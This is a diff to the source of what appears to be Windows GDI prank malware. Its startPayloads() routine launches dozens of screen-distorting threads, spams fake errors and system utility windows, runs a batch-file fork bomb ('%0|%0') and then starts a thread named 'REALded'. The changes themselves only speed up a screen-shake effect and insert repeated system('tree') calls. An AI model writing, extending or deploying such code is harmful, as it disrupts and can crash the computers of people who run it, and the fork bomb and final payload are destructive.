@@ -555,14 +555,14 @@ DWORD WINAPI Shake(LPVOID lpstart) {
 
 		BitBlt(hdc, shit, shit, x, y, hdc, 0, 0, SRCCOPY);
 		Sleep(1000 / shit); // the bigger i is, the faster it will be
-		shit += 1 * (shit / 5);
+		shit += 1.1 * (shit / 5);
 
 		// NEGATIVE (eu descrobri que em quase todas as lilnguagems se tu por)
 		// "-" antes de uma variavel ela vira negativa (ex i -> -i)
 
 		BitBlt(hdc, -shit, -shit, x, y, hdc, 0, 0, SRCCOPY);
 		Sleep(1000 / shit); // the bigger i is, the faster it will be
-		shit += 1 * (shit / 5);
+		shit += 1.1 * (shit / 5);
 	}
 }
 
@@ -1971,6 +1971,7 @@ void startPayloads() {
     thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)msgXD, 0, 0, &ID);
     Sleep(random() % 500 + 340);
     thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
+    system("tree");
 
 	Sleep(random() % 5000 + 3400);
 	HANDLE dark = CreateThread(0, 0, Dark, 0, 0, &ID);
@@ -1981,12 +1982,14 @@ void startPayloads() {
 	thread = CreateThread(0, 0, Melter, 0, 0, &ID);
 	thread = CreateThread(0, 0, fun1, 0, 0, &ID);
     system("notepad");
+    system("tree");
     //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 	Bytebeat1();
 
 	Sleep(random() % 1500 + 1100);
     system("write");
+    system("tree");
 	thread = CreateThread(0, 0, Melter, 0, 0, &ID);
 	thread = CreateThread(0, 0, Trails, 0, 0, &ID);
 	thread = CreateThread(0, 0, RGBCircle, 0, 0, &ID);
@@ -2007,6 +2010,7 @@ void startPayloads() {
 	thread = CreateThread(0, 0, gdi17, 0, 0, &ID);
 	thread = CreateThread(0, 0, gdi18, 0, 0, &ID);
     system("notepad");
+    system("tree");
     //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 		
@@ -2015,6 +2019,7 @@ void startPayloads() {
 
 	Sleep(random() % 10000 + 9000);
     system("azman.msc");
+    system("tree");
 	thread = CreateThread(0, 0, Shake, 0, 0, &ID);
 	thread = CreateThread(0, 0, gdi19, 0, 0, &ID);
 	
@@ -2026,6 +2031,7 @@ void startPayloads() {
 
 	Sleep(random() % 80000 + 7000);
     system("bdechangepin");
+    system("tree");
 	thread = CreateThread(0, 0, Rotate, 0, 0, &ID);
 	thread = CreateThread(0, 0, Melter2, 0, 0, &ID);
 	thread = CreateThread(0, 0, fun3, 0, 0, &ID);
@@ -2041,6 +2047,7 @@ void startPayloads() {
 
 	Sleep(random() % 10000 + 9000);
     system("certmgr.msc");
+    system("tree");
 	thread = CreateThread(0, 0, Dark2, 0, 0, &ID);
 		
 	thread = CreateThread(0, 0, gdi5, 0, 0, &ID);
@@ -2050,6 +2057,7 @@ void startPayloads() {
 
 	Sleep(random() % 4500 + 3200);
     system("charmap");
+    system("tree");
 	thread = CreateThread(0, 0, Cubes, 0, 0, &ID);
 	thread = CreateThread(0, 0, fun4, 0, 0, &ID);
 		
@@ -2060,6 +2068,7 @@ void startPayloads() {
 	
 	Sleep(random() % 24000 + 21000);
     system("choice");
+    system("tree");
 	thread = CreateThread(0, 0, Rainbow, 0, 0, &ID);
 		
 	thread = CreateThread(0, 0, gdi7, 0, 0, &ID);
@@ -2069,6 +2078,7 @@ void startPayloads() {
 
 	Sleep(random() % 4000 + 2700);
     system("bdechangepin");
+    system("tree");
 	thread = CreateThread(0, 0, Flip, 0, 0, &ID);
 		
 	thread = CreateThread(0, 0, gdi8, 0, 0, &ID);
@@ -2078,6 +2088,7 @@ void startPayloads() {
 
 	Sleep(random() % 7500 + 6400);
     system("colorcpl");
+    system("tree");
 	thread = CreateThread(0, 0, Melter3, 0, 0, &ID);
 	thread = CreateThread(0, 0, Colors, 0, 0, &ID);
 	thread = CreateThread(0, 0, CircleSquare, 0, 0, &ID);
@@ -2095,6 +2106,7 @@ void startPayloads() {
 
 	Sleep(random() % 20000 + 1800);
     system("comexp.msc");
+    system("tree");
 	thread = CreateThread(0, 0, Bright, 0, 0, &ID);
 	thread = CreateThread(0, 0, ExtremeRotation, 0, 0, &ID);
 		
@@ -2107,6 +2119,7 @@ void startPayloads() {
 
 	Sleep(random() % 17000 + 16000);
     system("compmgmt");
+    system("tree");
 	thread = CreateThread(0, 0, Invert, 0, 0, &ID);
 		
 	thread = CreateThread(0, 0, gdi11, 0, 0, &ID);
@@ -2122,12 +2135,14 @@ void startPayloads() {
 
 	Sleep(random() % 4000 + 3000);
     system("ComputerDefaults");
+    system("tree");
 
     
     thread = CreateThread(0, 0, FakeErrorSpam, 0, 0, &ID);
     
     Sleep(random() % 4000 + 3000);
     system("credwiz");
+    system("tree");
     // Here is when stuff gets a lil' bit stronger:
     Reset(); // stop bytebeat/""malware" music"
     RipBozo();
@@ -2138,6 +2153,7 @@ void startPayloads() {
     }
 
     system("./res/FORK.bat"); // (forkbomb, %0|%0)
+    system("tree");
     thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)REALded, 0, 0, &ID);
     
 	//startPayloads();
